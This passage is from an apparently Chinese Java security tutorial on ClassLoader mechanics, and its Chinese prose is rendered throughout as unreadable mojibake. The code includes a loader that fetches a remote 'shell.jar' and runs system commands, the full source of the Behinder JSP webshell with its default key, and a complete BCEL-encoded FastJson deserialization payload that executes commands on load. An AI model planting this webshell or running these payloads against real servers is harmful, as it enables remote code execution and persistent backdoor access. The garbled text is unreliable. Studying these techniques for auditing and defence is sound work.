class="java">IndexJava indexJava = new IndexJava();
String str = indexJava.test();
System.out.println(str);
</code></pre><p>ä½†æ˜¯å¦‚æœ <code>com.liangc.classloader.IndexJava</code> æ ¹æœ¬å°±ä¸å­˜åœ¨äºæˆ‘ä»¬çš„ <code>classpath</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨é‡å†™ <code>findClass</code> æ–¹æ³•ï¼Œç„¶ååœ¨è°ƒç”¨ <code>defineClass</code> æ–¹æ³•çš„æ—¶å€™ä¼ å…¥ <code>IndexJava</code> ç±»çš„å­—èŠ‚ç çš„æ–¹å¼æ¥å‘ JVM ä¸­å®šä¹‰ä¸€ä¸ª <code>IndexJava</code> ç±»ï¼Œæœ€åé€šè¿‡åå°„æœºåˆ¶å°±å¯ä»¥è°ƒç”¨ <code>IndexJava</code> ç±»çš„ <code>test</code> æ–¹æ³•</p><ol><li>ç”Ÿæˆ <code>class</code> æ–‡ä»¶ <code>javac IndexJava.java</code> ï¼ˆè¿™é‡Œçš„javacç‰ˆæœ¬å’Œjavaç‰ˆæœ¬ä¿æŒä¸€è‡´ï¼Œå³å…¨æ˜¯8æˆ–è€…å…¨æ˜¯17ç­‰ç­‰ï¼‰</li></ol><pre><code class="java">package com.liangc.test;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class FileOS &#123;
    public static byte[] GetContent(String filePath) throws IOException &#123;
        File file = new File(filePath);
        long fileSize = file.length();
        if (fileSize &gt; Integer.MAX_VALUE) &#123;
            return null;
        &#125;
        FileInputStream fi = new FileInputStream(file);
        byte[] buffer = new byte[(int) fileSize];
        int offset = 0;
        int numRead = 0;
        while (offset &lt; buffer.length
                &amp;&amp; (numRead = fi.read(buffer, offset, buffer.length - offset)) &gt;= 0) &#123;
            offset += numRead;
        &#125;
        // ç¡®ä¿æ‰€æœ‰æ•°æ®å‡è¢«è¯»å–
        if (offset != buffer.length) &#123;
            throw new IOException(&quot;Could not completely read file &quot;
                    + file.getName());
        &#125;
        fi.close();
        return buffer;
    &#125;

    public static void main(String[] args) throws IOException &#123;
        FileOS fileOS = new FileOS();
        byte[] bytes = fileOS.GetContent(&quot;H:\\Object\\Java\\JavaSec\\classloader\\src\\com\\liangc\\classloader\\IndexJava.class&quot;);// è¿™é‡Œä¼ å…¥classæ–‡ä»¶è·¯å¾„
        for (byte b :
                bytes) &#123;
            System.out.print(b+&quot;,&quot;);
        &#125;
    &#125;
&#125;
</code></pre><ol start="2"><li>å¤åˆ¶åˆ°ä»£ç ä¸­</li></ol><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230716164129546.png" title="image-20230716164129546"><ol start="3"><li>åˆ æ‰IndexJava.javaåè¿è¡Œä»£ç </li></ol><pre><code class="java">package com.liangc.classloader;

public class Test extends ClassLoader &#123;
    public static String className = &quot;com.liangc.classloader.IndexJava&quot;;
    public static byte[] classContent = new byte[]&#123;
            -54,-2,-70,-66,0,0,0,52,0,17,10,0,4,0,13,8,0,14,7,0,15,7,0,16,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,4,116,101,115,116,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,14,73,110,100,101,120,74,97,118,97,46,106,97,118,97,12,0,5,0,6,1,0,31,116,104,105,115,32,105,115,32,116,101,115,116,44,32,116,104,101,32,99,111,100,101,32,105,115,32,111,107,32,33,32,1,0,32,99,111,109,47,108,105,97,110,103,99,47,99,108,97,115,115,108,111,97,100,101,114,47,73,110,100,101,120,74,97,118,97,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,0,33,0,3,0,4,0,0,0,0,0,2,0,1,0,5,0,6,0,1,0,7,0,0,0,29,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,1,0,8,0,0,0,6,0,1,0,0,0,3,0,1,0,9,0,10,0,1,0,7,0,0,0,27,0,1,0,1,0,0,0,3,18,2,-80,0,0,0,1,0,8,0,0,0,6,0,1,0,0,0,5,0,1,0,11,0,0,0,2,0,12
    &#125;;

    @Override
    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;
        if (name.equals(className)) &#123;
            // è°ƒç”¨JVMçš„nativeæ–¹æ³•å®šä¹‰TestHelloWorldç±»
            return defineClass(className, classContent, 0, classContent.length);
        &#125;
        return null;
    &#125;

    public static void main(String[] args) &#123;


        Test newLoader = new Test();
        try &#123;
            Class&lt;?&gt; aClass = newLoader.loadClass(className);
            Object testInstance = aClass.newInstance();
            Object invokeValue = testInstance.getClass().getMethod(&quot;test&quot;).invoke(testInstance);
            System.out.println(invokeValue);

        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre><p>åˆ©ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨æˆ‘ä»¬å¯ä»¥åœ¨ webshell ä¸­å®ç°åŠ è½½å¹¶è°ƒç”¨è‡ªå·±ç¼–è¯‘çš„ç±»å¯¹è±¡ï¼Œæ¯”å¦‚æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´è°ƒç”¨è‡ªå®šä¹‰ç±»å­—èŠ‚ç çš„ native æ–¹æ³•ç»•è¿‡ RASP æ£€æµ‹ï¼Œä¹Ÿå¯ä»¥ç”¨äºåŠ å¯†é‡è¦çš„ Java ç±»å­—èŠ‚ç ï¼ˆåªèƒ½ç®—å¼±åŠ å¯†äº†ï¼‰</p><h1 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h1><p><code>URLClassLoader</code> ç»§æ‰¿äº† <code>ClassLoader</code>ï¼Œ<code>URLClassLoader</code> æä¾›äº†åŠ è½½è¿œç¨‹èµ„æºçš„èƒ½åŠ›ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„ <code>payload</code> æˆ–è€… <code>webshell</code> çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ¥åŠ è½½è¿œç¨‹çš„ jar æ¥å®ç°è¿œç¨‹çš„ç±»æ–¹æ³•è°ƒç”¨</p><ul><li>è¿œç¨‹jarä¸­çš„Shellç±»</li></ul><pre><code class="java">import java.io.IOException;

public class Shell &#123;
    public Shell() &#123;
    &#125;

    public static Process exec(String str) throws IOException &#123;
        return Runtime.getRuntime().exec(str);
    &#125;
&#125;
</code></pre><ul><li>è¿œç¨‹è°ƒç”¨</li></ul><pre><code class="java">package com.liangc.classloader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class URLTest &#123;
    public static void main(String[] args) &#123;
        try&#123;
            // å®šä¹‰è¿œç¨‹åŠ è½½çš„jarè·¯å¾„
            URL url = new URL(&quot;http://192.168.226.1/shell.jar&quot;);

            // åˆ›å»ºURLClassLoaderå¯¹è±¡ï¼Œå¹¶åŠ è½½è¿œç¨‹jaråŒ…
            URLClassLoader ucl = new URLClassLoader(new URL[]&#123;url&#125;);

            // å®šä¹‰éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤
            String cmd = &quot;net user&quot;;

            // é€šè¿‡URLClassLoaderåŠ è½½è¿œç¨‹jaråŒ…ä¸­çš„CMDç±»
            Class&lt;?&gt; cmdClass = ucl.loadClass(&quot;Shell&quot;);
            Process process = (Process) cmdClass.getMethod(&quot;exec&quot;, String.class).invoke(null, cmd);

            // è·å–å‘½ä»¤æ‰§è¡Œç»“æœçš„è¾“å…¥æµ
            InputStream in   = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[]                b    = new byte[1024];
            int                   a    = -1;

            // è¯»å–å‘½ä»¤æ‰§è¡Œç»“æœ
            while ((a = in.read(b)) != -1) &#123;
                baos.write(b, 0, a);
            &#125;

            // è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ
            System.out.println(baos.toString());
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre><h1 id="ç±»åŠ è½½éš”ç¦»"><a href="#ç±»åŠ è½½éš”ç¦»" class="headerlink" title="ç±»åŠ è½½éš”ç¦»"></a>ç±»åŠ è½½éš”ç¦»</h1><p>åˆ›å»ºç±»åŠ è½½å™¨çš„æ—¶å€™å¯ä»¥æŒ‡å®šè¯¥ç±»åŠ è½½çš„çˆ¶ç±»åŠ è½½å™¨ï¼ŒClassLoader æ˜¯æœ‰éš”ç¦»æœºåˆ¶çš„ï¼Œä¸åŒçš„ ClassLoader å¯ä»¥åŠ è½½ç›¸åŒçš„ Classï¼ˆä¸¤è€…å¿…é¡»æ˜¯éç»§æ‰¿å…³ç³»ï¼‰ï¼ŒåŒçº§ ClassLoader è·¨ç±»åŠ è½½å™¨è°ƒç”¨æ–¹æ³•æ—¶å¿…é¡»ä½¿ç”¨åå°„</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230716105252659.png" title="image-20230716105252659"><h2 id="è·¨ç±»åŠ è½½å™¨åŠ è½½"><a href="#è·¨ç±»åŠ è½½å™¨åŠ è½½" class="headerlink" title="è·¨ç±»åŠ è½½å™¨åŠ è½½"></a>è·¨ç±»åŠ è½½å™¨åŠ è½½</h2><p>RASP å’Œ IAST ç»å¸¸ä¼šç”¨åˆ°è·¨ç±»åŠ è½½å™¨åŠ è½½ç±»çš„æƒ…å†µï¼Œå› ä¸º RASP&#x2F;IAST ä¼šåœ¨ä»»æ„å¯èƒ½å­˜åœ¨å®‰å…¨é£é™©çš„ç±»ä¸­æ’å…¥æ£€æµ‹ä»£ç ï¼Œå› æ­¤å¿…é¡»å¾—ä¿è¯ RASP&#x2F;IAST çš„ç±»èƒ½å¤Ÿè¢«æ’å…¥çš„ç±»æ‰€ä½¿ç”¨çš„ç±»åŠ è½½æ­£ç¡®åŠ è½½ï¼Œå¦åˆ™å°±ä¼šå‡ºç° ClassNotFoundException</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œè·¨ç±»åŠ è½½å™¨è°ƒç”¨ç±»æ–¹æ³•æ—¶éœ€è¦ç‰¹åˆ«æ³¨æ„ä¸€ä¸ªåŸºæœ¬åŸåˆ™ï¼š<code>ClassLoader A</code> å’Œ <code>ClassLoader B</code> å¯ä»¥åŠ è½½ç›¸åŒç±»åçš„ç±»ï¼Œä½†æ˜¯<code>ClassLoader A</code> ä¸­çš„ <code>Class A</code> å’Œ<code>ClassLoader B</code> ä¸­çš„ <code>Class A</code> æ˜¯å®Œå…¨ä¸åŒçš„å¯¹è±¡ï¼Œä¸¤è€…ä¹‹é—´è°ƒç”¨åªèƒ½é€šè¿‡åå°„</p><pre><code class="java">package com.liangc.classloader;

import java.lang.reflect.Method;
import static com.liangc.classloader.Test.className;
import static com.liangc.classloader.Test.classContent;

public class TestCrossLoader &#123;

    public static class ClassLoaderA extends ClassLoader &#123;

        public ClassLoaderA(ClassLoader parent) &#123;
            super(parent);
        &#125;

        &#123;
            // åŠ è½½ç±»å­—èŠ‚ç 
            defineClass(className, classContent, 0, classContent.length);
        &#125;

    &#125;

    public static class ClassLoaderB extends ClassLoader &#123;

        public ClassLoaderB(ClassLoader parent) &#123;
            super(parent);
        &#125;

        &#123;
            // åŠ è½½ç±»å­—èŠ‚ç 
            defineClass(className, classContent, 0, classContent.length);
        &#125;

    &#125;

    public static void main(String[] args) throws Exception &#123;
        // çˆ¶ç±»åŠ è½½å™¨
        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();

        // Aç±»åŠ è½½å™¨
        ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);

        // Bç±»åŠ è½½å™¨
        ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);

        // ä½¿ç”¨A/Bç±»åŠ è½½å™¨åŠ è½½åŒä¸€ä¸ªç±»
        Class&lt;?&gt; aClass  = Class.forName(className, true, aClassLoader);
        Class&lt;?&gt; aaClass = Class.forName(className, true, aClassLoader);
        Class&lt;?&gt; bClass  = Class.forName(className, true, bClassLoader);

        // æ¯”è¾ƒAç±»åŠ è½½å’ŒBç±»åŠ è½½å™¨åŠ è½½çš„ç±»æ˜¯å¦ç›¸ç­‰
        System.out.println(&quot;aClass == aaClassï¼š&quot; + (aClass == aaClass));
        System.out.println(&quot;aClass == bClassï¼š&quot; + (aClass == bClass));

        System.out.println(&quot;\n&quot; + aClass.getName() + &quot;æ–¹æ³•æ¸…å•ï¼š&quot;);

        // è·å–è¯¥ç±»æ‰€æœ‰æ–¹æ³•
        Method[] methods = aClass.getDeclaredMethods();

        for (Method method : methods) &#123;
            System.out.println(method);
        &#125;

        // åˆ›å»ºç±»å®ä¾‹
        Object instanceA = aClass.newInstance();

        // è·å–testæ–¹æ³•
        Method helloMethod = aClass.getMethod(&quot;test&quot;);

        // è°ƒç”¨helloæ–¹æ³•
        String result = (String) helloMethod.invoke(instanceA);

        System.out.println(&quot;\nåå°„è°ƒç”¨ï¼š&quot; + className + &quot;ç±»&quot; + helloMethod.getName() + &quot;æ–¹æ³•ï¼Œè¿”å›ç»“æœï¼š&quot; + result);
    &#125;

&#125;
</code></pre><h1 id="JSP-è‡ªå®šä¹‰ç±»åŠ è½½åé—¨"><a href="#JSP-è‡ªå®šä¹‰ç±»åŠ è½½åé—¨" class="headerlink" title="JSP è‡ªå®šä¹‰ç±»åŠ è½½åé—¨"></a>JSP è‡ªå®šä¹‰ç±»åŠ è½½åé—¨</h1><p><code>å†°è</code> çš„ JSP åé—¨åˆ©ç”¨çš„å°±æ˜¯è‡ªå®šä¹‰ç±»åŠ è½½å®ç°çš„ï¼Œå†°èçš„å®¢æˆ·ç«¯ä¼šå°†å¾…æ‰§è¡Œçš„å‘½ä»¤æˆ–ä»£ç ç‰‡æ®µé€šè¿‡åŠ¨æ€ç¼–è¯‘æˆç±»å­—èŠ‚ç å¹¶åŠ å¯†åä¼ åˆ°å†°èçš„ JSP åé—¨ï¼Œåé—¨ä¼šç»è¿‡ AES è§£å¯†å¾—åˆ°ä¸€ä¸ªéšæœºç±»åçš„ç±»å­—èŠ‚ç ï¼Œç„¶åè°ƒç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨åŠ è½½ï¼Œæœ€ç»ˆé€šè¿‡è¯¥ç±»é‡å†™çš„ <code>equals</code> æ–¹æ³•å®ç°æ¶æ„æ”»å‡»ï¼Œå…¶ä¸­ <code>equals</code> æ–¹æ³•ä¼ å…¥çš„ <code>pageContext</code> å¯¹è±¡æ˜¯ä¸ºäº†ä¾¿äºè·å–åˆ°è¯·æ±‚å’Œå“åº”å¯¹è±¡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å†°èçš„å‘½ä»¤æ‰§è¡Œç­‰å‚æ•°ä¸ä¼šä»è¯·æ±‚ä¸­è·å–ï¼Œè€Œæ˜¯ç›´æ¥æ’å…¥åˆ°äº†ç±»æˆå‘˜å˜é‡ä¸­</p><pre><code class="java">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;
&lt;%!
    class U extends ClassLoader &#123;

        U(ClassLoader c) &#123;
            super(c);
        &#125;

        public Class g(byte[] b) &#123;
            return super.defineClass(b, 0, b.length);
        &#125;
    &#125;
%&gt;
&lt;%
    if (request.getMethod().equals(&quot;POST&quot;)) &#123;
        String k = &quot;e45e329feb5d925b&quot;;/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/
        session.putValue(&quot;u&quot;, k);
        Cipher c = Cipher.getInstance(&quot;AES&quot;);
        c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    &#125;
%&gt;
</code></pre><h1 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h1><p><span class="exturl" data-url="aHR0cHM6Ly9jb21tb25zLmFwYWNoZS5vcmcvcHJvcGVyL2NvbW1vbnMtYmNlbC8=">BCEL</span>ï¼ˆ<code>Apache Commons BCELâ„¢</code>ï¼‰æ˜¯ä¸€ä¸ªç”¨äºåˆ†æã€åˆ›å»ºå’Œæ“çºµ Java ç±»æ–‡ä»¶çš„å·¥å…·åº“ï¼ŒOracle JDK å¼•ç”¨äº† BCEL åº“ï¼Œä¸è¿‡ä¿®æ”¹äº†åŸåŒ…å <code>org.apache.bcel.util.ClassLoader</code> ä¸º <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>ï¼ŒBCEL çš„ç±»åŠ è½½å™¨åœ¨è§£æç±»åæ—¶ä¼šå¯¹ ClassName ä¸­æœ‰ <code>$$BCEL$$</code> æ ‡è¯†çš„ç±»åšç‰¹æ®Šå¤„ç†ï¼Œè¯¥ç‰¹æ€§ç»å¸¸è¢«ç”¨äºç¼–å†™å„ç±»æ”»å‡» Payloadã€‚</p><h2 id="BCEL-æ”»å‡»åŸç†"><a href="#BCEL-æ”»å‡»åŸç†" class="headerlink" title="BCEL æ”»å‡»åŸç†"></a>BCEL æ”»å‡»åŸç†</h2><p>å½“ BCEL çš„ <code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code> åŠ è½½ä¸€ä¸ªç±»åä¸­å¸¦æœ‰ <code>$$BCEL$$</code> çš„ç±»æ—¶ä¼šæˆªå–å‡º <code>$$BCEL$$</code> åé¢çš„å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨ <code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code> å°†å­—ç¬¦ä¸²è§£ææˆç±»å­—èŠ‚ç ï¼ˆå¸¦æœ‰æ”»å‡»ä»£ç çš„æ¶æ„ç±»ï¼‰ï¼Œæœ€åä¼šè°ƒç”¨ <code>defineClass</code> æ³¨å†Œè§£ç åçš„ç±»ï¼Œä¸€æ—¦è¯¥ç±»è¢«åŠ è½½å°±ä¼šè§¦å‘ç±»ä¸­çš„æ¶æ„ä»£ç ï¼Œæ­£æ˜¯å› ä¸º BCEL æœ‰äº†è¿™ä¸ªç‰¹æ€§ï¼Œæ‰å¾—ä»¥è¢«å¹¿æ³›çš„åº”ç”¨äºå„ç±»æ”»å‡» Payload ä¸­ã€‚</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230716164712318.png" title="image-20230716164712318"><h2 id="BCEL-ç¼–è§£ç "><a href="#BCEL-ç¼–è§£ç " class="headerlink" title="BCEL ç¼–è§£ç "></a>BCEL ç¼–è§£ç </h2><p><strong>BCEL ç¼–ç </strong></p><pre><code class="java">private static final byte[] CLASS_BYTES = new byte[]&#123;ç±»å­—èŠ‚ç byteæ•°ç»„&#125;];

// BCELç¼–ç ç±»å­—èŠ‚ç 
String className = &quot;$$BCEL$$&quot; + com.sun.org.apache.bcel.internal.classfile.Utility.encode(CLASS_BYTES, true);
</code></pre><p>ç¼–ç åçš„ç±»åï¼š$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbn$dâ€¦â€¦ï¼ŒBCEL ä¼šå¯¹ç±»å­—èŠ‚ç è¿›è¡Œç¼–ç </p><p><strong>BCEL è§£ç </strong></p><pre><code class="java">int    index    = className.indexOf(&quot;$$BCEL$$&quot;);
String realName = className.substring(index + 8);

// BCELè§£ç ç±»å­—èŠ‚ç 
byte[] bytes = com.sun.org.apache.bcel.internal.classfile.Utility.decode(realName, true);
</code></pre><p>å¦‚æœè¢«åŠ è½½çš„ç±»åä¸­åŒ…å«äº† <code>$$BCEL$$</code> å…³é”®å­—ï¼ŒBCEL å°±ä¼šä½¿ç”¨ç‰¹æ®Šçš„æ–¹å¼è¿›è¡Œè§£ç å¹¶åŠ è½½è§£ç ä¹‹åçš„ç±»ã€‚</p><p><strong>BCEL å…¼å®¹æ€§é—®é¢˜</strong></p><p>BCEL è¿™ä¸ªç‰¹æ€§ä»…é€‚ç”¨äº BCEL 6.0 ä»¥ä¸‹ï¼Œå› ä¸ºä» 6.0 å¼€å§‹ <code>org.apache.bcel.classfile.ConstantUtf8#setBytes</code> å°±å·²ç»è¿‡æ—¶äº†</p><pre><code class="java">/**
* @param bytes the raw bytes of this Utf-8
* @deprecated (since 6.0)
*/
@java.lang.Deprecated
public final void setBytes( final String bytes ) &#123;
  throw new UnsupportedOperationException();
&#125;
</code></pre><p>Oracle è‡ªå¸¦çš„ BCEL æ˜¯ä¿®æ”¹äº†åŸå§‹çš„åŒ…åï¼Œå› æ­¤ä¹Ÿæœ‰å…¼å®¹æ€§é—®é¢˜ï¼Œå·²çŸ¥æ”¯æŒè¯¥ç‰¹æ€§çš„ JDK ç‰ˆæœ¬ä¸ºï¼š<code>JDK1.5 - 1.7</code>ã€<code>JDK8 - JDK8u241</code>ã€<code>JDK9</code></p><p><strong>BCEL FastJson æ”»å‡»é“¾åˆ†æ</strong></p><p>Fastjsonï¼ˆ1.1.15 - 1.2.4ï¼‰å¯ä»¥ä½¿ç”¨å…¶ä¸­æœ‰ä¸ª dbcp çš„ Payload å°±æ˜¯åˆ©ç”¨äº† BCEL æ”»å‡»é“¾ï¼Œåˆ©ç”¨ä»£ç å¦‚ä¸‹</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.commons.dbcp.BasicDataSource&quot;,&quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85R$5bO$TA$U$fe$a6$z$dde$bbXX$$$e2$F$z$8aPJ$e9r$x$X$r$3e$d8$60$a2$U1$b6$b1$89o$d3$e9$a4$ynw$9b$dd$a9$c2$l1$f1$X$f0$cc$L$S$l$fc$B$fe$p$l4$9e$5d$h$U$rqvsf$ce7$e7$7c$e7$9b$99$f3$f5$c7$e7$_$AV$b0i$m$8b$9b$3an$e9$b8m$60$Kwt$dc5$90$c3$b4$8e$7b$3a$ee$eb$981$f0$A$b3$91$99$d3$907$60b$5eCA$c3$CCz$db$f1$i$f5$98$n$99$9f$7f$cd$90$aa$f8$z$c9$90$ad$3a$9e$7c$d1$eb4eP$e7M$97$Q$7d$5b$b8$fd$c8$a1$9a$e2$e2$ed$k$ef$c6$5b$g$8a$c4$c9$60$d4$fc$5e$m$e4S$t$8a$b6$ea2TO$w$3b$d5$8a$cb$c3$b0t$c8$dfq$T$c3$Ya$98$f0$bb$d2$cb$z$f2$5c$85$bb$a2$e7r$e5$H$r$de$ed2h$7eX$f2x$87$f8$WM$94$60$T$d2p$bc$96$ff$3e$a4$K$s$96$b0L$c9$82$92r$cb$x$abk$e5$f5$8d$cd$ad$a5$fe$8aa$80$f4$f6$8e$Y$c6D$_ps$aeOq$H$7e$a8$kn$d1$b05$ac$98X$c5$9a$892$d6$ZF$p5$b6$e3$db$cf$f6w$8e$84$ec$w$c7$f7LlD$e2$e6$84$df$b1$b9$d7$e4$8e$jJa$8bH$bc$eb$f3$96$M$ecK$Hb$Y$8eI$5c$ee$b5$ed$fd$e6$a1$U$ea$STS$81$e3$b5$_C$c7$a1$92$j$86L$5b$aa$97$B$5dB$a0$8e$Zf$f3$d5$bf$b3$k$cd$ff$L$d1$ed$86$8a$H$wl8$ea$80a$fc$aa$ac7$M$p$bf$d1W$3dO9$jz$J$83$ea$5d8$e3$f9$3f$c9$fb0$b1$a7$e4$91$Ut$fc$ff$a8$n$ddB$86$n$rd$bb$b4$a9$e2$3e$a8$H$5cHL$e3$g$f5$604$S$60$d1K$93$b5$c8$9b$a2$99$d1$3cP$f8$EvJ$L$ba$7f$b2$e9_$mt$8c$5d$84$7e$a0$d4$q$cde$x$b1k$r$cf$91$aa$$X$DgH$7f$c4$a0$a5$ed$9e$m$bb$60$e9$b1$9b$b6$Gw$cfa$U$ce$90i$9c$40$df$x$9ea$e8$94HfP$84M$bd$9d$88K$94$90$n$ab$T$e5$m$7d$Z$wab$SC$b1$d2$Z$f2$8a$Y$a7$e8Qj$ac1$aca$82$3c$90$97$fa$8eI$N$T$f4g$9ek$b8$fe$N$v$o$9e$8c$8fu$e3$t$b2$b7e$b6p$D$A$A&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;org.apache.bcel.util.ClassLoader&quot;&#125;&#125;
</code></pre><p>FastJson è‡ªåŠ¨è°ƒç”¨ setter æ–¹æ³•ä¿®æ”¹ <code>org.apache.commons.dbcp.BasicDataSource</code> ç±»çš„ <code>driverClassName</code> å’Œ <code>driverClassLoader</code> å€¼ï¼Œ<code>driverClassName</code> æ˜¯ç»è¿‡ BCEL ç¼–ç åçš„ <code>com.anbai.sec.classloader.TestBCELClass</code> ç±»å­—èŠ‚ç ï¼Œ<code>driverClassLoader</code> æ˜¯ä¸€ä¸ªç”± FastJson åˆ›å»ºçš„ <code>org.apache.bcel.util.ClassLoader</code> å®ä¾‹</p><pre><code class="java">package com.anbai.sec.classloader;

import java.io.IOException;

public class TestBCELClass &#123;

    static &#123;
        String command = &quot;open -a Calculator.app&quot;;
        String osName  = System.getProperty(&quot;os.name&quot;);

        if (osName.startsWith(&quot;Windows&quot;)) &#123;
            command = &quot;calc 12345678901234567&quot;;
        &#125; else if (osName.startsWith(&quot;Linux&quot;)) &#123;
            command = &quot;curl localhost:9999/&quot;;
        &#125;

        try &#123;
            Runtime.getRuntime().exec(command);
        &#125; catch (IOException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;

&#125;
</code></pre><h1 id="Xalan-ClassLoader"><a href="#Xalan-ClassLoader" class="headerlink" title="Xalan ClassLoader"></a>Xalan ClassLoader</h1><p>Xalan å’Œ BCEL ä¸€æ ·éƒ½ç»å¸¸è¢«ç”¨äºç¼–å†™ååºåˆ—åŒ– Payloadï¼ŒOracle JDK é»˜è®¤ä¹Ÿå¼•ç”¨äº† Xalanï¼ŒåŒæ—¶ä¿®æ”¹äº†åŸåŒ…å <code>org.apache.xalan.xsltc.trax.TemplatesImpl</code> ä¸º <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ï¼ŒXalan æœ€å¤§çš„ç‰¹ç‚¹æ˜¯å¯ä»¥ä¼ å…¥ç±»å­—èŠ‚ç å¹¶åˆå§‹åŒ–ï¼ˆéœ€è¦è°ƒç”¨ <code>getOutputProperties</code> æ–¹æ³•ï¼‰ï¼Œä»è€Œå®ç° RCEï¼Œæ¯”å¦‚ Fastjson å’Œ Jackson ä¼šä½¿ç”¨åå°„è°ƒç”¨ <code>getter/setter</code> æˆ– <code>æˆå‘˜å˜é‡æ˜ å°„</code> çš„æ–¹å¼å®ç° JSON ååºåˆ—åŒ–</p><p><code>TemplatesImpl</code> ä¸­æœ‰ä¸€ä¸ª <code>_bytecodes</code> æˆå‘˜å˜é‡ï¼Œç”¨äºå­˜å‚¨ç±»å­—èŠ‚ç ï¼Œé€šè¿‡ JSON ååºåˆ—åŒ–çš„æ–¹å¼å¯ä»¥ä¿®æ”¹è¯¥å˜é‡å€¼ï¼Œä½†å› ä¸ºè¯¥æˆå‘˜å˜é‡æ²¡æœ‰å¯æ˜ å°„çš„ get&#x2F;set æ–¹æ³•æ‰€ä»¥éœ€è¦ä¿®æ”¹ JSON åº“çš„è™šæ‹ŸåŒ–é…ç½®ï¼Œæ¯”å¦‚ Fastjson è§£ææ—¶å¿…é¡»å¯ç”¨ <code>Feature.SupportNonPublicField</code>ã€Jackson å¿…é¡»å¼€å¯ <code>JacksonPolymorphicDeserialization</code>ï¼ˆè°ƒç”¨ <code>mapper.enableDefaultTyping()</code>ï¼‰ï¼Œæ‰€ä»¥åˆ©ç”¨æ¡ä»¶ç›¸å¯¹è¾ƒé«˜</p><p><code>ClassLoader</code> æ˜¯ JVM ä¸­ä¸€ä¸ªéå¸¸é‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼Œ<code>ClassLoader</code> å¯ä»¥ä¸ºæˆ‘ä»¬åŠ è½½ä»»æ„çš„ java ç±»ï¼Œé€šè¿‡è‡ªå®šä¹‰ <code>ClassLoader</code> æ›´èƒ½å¤Ÿå®ç°è‡ªå®šä¹‰ç±»åŠ è½½è¡Œä¸ºï¼Œåœ¨åé¢çš„å‡ ä¸ªç« èŠ‚æˆ‘ä»¬ä¹Ÿå°†è®²è§£ <code>ClassLoader</code> çš„å®é™…åˆ©ç”¨åœºæ™¯</p><div class="tags"><a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="ic i-tag"></i> Javaä»£ç å®¡è®¡</a> <a href="/tags/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="tag"><i class="ic 